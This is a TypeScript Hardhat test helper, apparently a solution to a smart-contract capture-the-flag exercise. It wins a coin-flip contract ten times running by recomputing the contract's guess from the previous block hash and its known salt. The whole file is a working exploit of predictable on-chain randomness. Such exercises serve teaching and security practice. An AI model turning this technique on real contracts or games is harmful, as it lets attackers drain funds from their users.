import { expect } from "chai";
import { ethers, waffle } from "hardhat";

const helper = async (victim: any, attacker: any) => {
  // add code here that will help you pass the test
  const coinFlipSalt = BigInt(57896044618658097711785492504343953926634992332820282019728792003956564819968);

  for (let i = 0; i < 10; i++) {
    const latestBlockNumber = await waffle.provider.getBlockNumber() + 1;
    const previousBlockHash = BigInt((await waffle.provider.getBlock(latestBlockNumber - 1)).hash);
    await victim.flip((previousBlockHash / coinFlipSalt) == BigInt(1));
  }
};

export default helper;
